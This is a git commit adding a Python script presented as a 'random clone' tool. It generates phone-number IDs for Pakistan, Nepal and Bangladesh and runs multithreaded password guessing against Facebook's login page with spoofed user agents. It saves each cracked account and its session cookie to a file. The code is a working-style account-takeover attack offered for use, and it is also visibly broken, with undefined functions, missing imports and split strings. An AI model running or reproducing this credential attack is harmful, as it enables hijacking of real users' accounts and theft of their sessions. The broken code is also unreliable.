d186a7e5836b23df32d7989bca568d59c7279691
B.C.Z <117699330+Faijul01@users.noreply.github.com>
2022-11-12 07:51:34 +0600

    Add files via upload

---
+++ B.C.Z.py
@@ -0,0 +1,195 @@
+P = '\1b[1;97m' # PUTIH
+M = '\1b[1;91m' # MERAH
+H = '\1b[1;92m' # HIJAU
+K = '\1b[1;93m' # KUNING
+B = '\1b[1;94m' # BIRU
+U = '\1b[1;95m' # UNGU
+O = '\1b[1;96m' # BIRU MUDA
+N = '\1b[0m'    # WARNA MATI
+A = '\1b[1;90m' # WARNA ABU ABU
+BN = '\1b[1;107m' # BELAKANG PUTIH
+BBL = '\1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\1b[1;105m' # BELAKANG PINK
+BB = '\1b[1;104m' # BELAKANG BIRU
+BK = '\1b[1;103m' # BELAKANG KUNING
+BH = '\1b[1;102m' # BELAKANG HIJAU
+BM = '\1b[1;101m' # BELAJANG MERAH
+BA = '\1b[1;100m' # BELAKANG ABU ABU
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+logo = ("""
+
+                                    
+██████╗░░░░░█████╗░░░░███████╗
+██╔══██╗░░░██╔══██╗░░░╚════██║
+██████╦╝░░░██║░░╚═╝░░░░░███╔═╝
+██╔══██╗░░░██║░░██╗░░░██╔══╝░░
+██████╦╝██╗╚█████╔╝██╗███████╗
+╚═════╝░╚═╝░╚════╝░╚═╝╚══════╝                     
+                                                         \33[1;32m=====================================================================
+\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;93m AUTHOR  \33[1;91m : \33[1;95m Faijul
+\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;93m FACEBOOK
+\33[1;91m : \33[1;95m https://www.facebook.com/profile.php?id=100014113654980
+\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;93m GITHUB  \33[1;91m : \33[1;95m Faijul01
+\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;93m TOOLS   \33[1;91m : \33[1;95m RANDOM CLONE
+\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;93m VERSION \33[1;91m : \33[1;32m 1.0.0
+\33[1;32m=====================================================================\""")
+
+loop = 0
+oks = []
+cps = []
+ 
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\\\33[1;33mLoading asset files ... \33[0;97m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\\33[1;31mNo internet connection ... \33[0;97m')
+#global functions
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\'+text+o),
+        sys.stdout.flush();time.sleep(1)
+
+#User agents
+ugen2=[]
+ugen=[]
+
+for xd in range(10000):
+    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+    # APK CHECK
+def i():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    jalan(logo)
+    jalan('\33[1;32m=====================================================================')
+    jalan('\33[1;32mPAK CODE   - \33[1;35m92301 \33[1;35m92302 \33[1;35m92303 \33[1;35m92305')
+    jalan('\33[1;32mNEPAL CODE - \33[1;34m97797 \33[1;34m97795 \33[1;34m97781 \33[1;34m97787')
+    jalan('\33[1;32mBD CODE    - \33[1;32m016 \33[1;32m017 \33[1;32m018 \33[1;32m019')
+    jalan('\33[1;32m=====================================================================\')
+    code = input('\33[1;32mCHOOSE YOUR COUNTRY CODE : ')
+    print("")
+    os.system('clear')
+    print(logo)
+    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\\\33[1;32mCHOOSE CLONING LIMIT : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        print('\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;32m TOTAL IDS: \33[1;32m'+tl)
+        print('\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;93m THE PROCESS HAS BEEN STARTED')
+        print('\33[1;95m[\33[1;93mâœ”ï¸Ž\33[1;95m]\33[1;34m WILL RUN ON ANY NETWORK')
+        print('\33[1;32m=====================================================================')
+        for love in user:
+            pwx = [love, 'bangladesh''112233445''gaming1234']
+            uid = code+love
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(' CRACK PROCESS HAS BEEN COMPLETED ')
+    print('IDS SAVED IN B.C.Z-505.txt, B.C.Z-505.txt')
+ 
+def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'www.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://www.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="107", "Not)A;Brand";v="24", "Chromium";v="107"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-p
+            latform": "cors",
+            "sec-fetch-dest": 'empty',
+            "sec-fetch-mode": 'cors',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[7:22]
+                print('\33[1;32mOVI-505-OK- ]' +uid+ ' | ' +ps+'\33[0;35m')
+                print(f"{H}\33[0;35m[COOKIE]'\33[1;32m{coki}")
+                cek_apk(session,coki)
+                open('/sdcard/b.c.z-505-OK.txt', 'a').write(uid+' | '+ps+'\')
+                oks.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\%s[b.c.z-505] \33[1;32m[%s/%s] \33[1;32m[OK-%s] \'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+
+o()
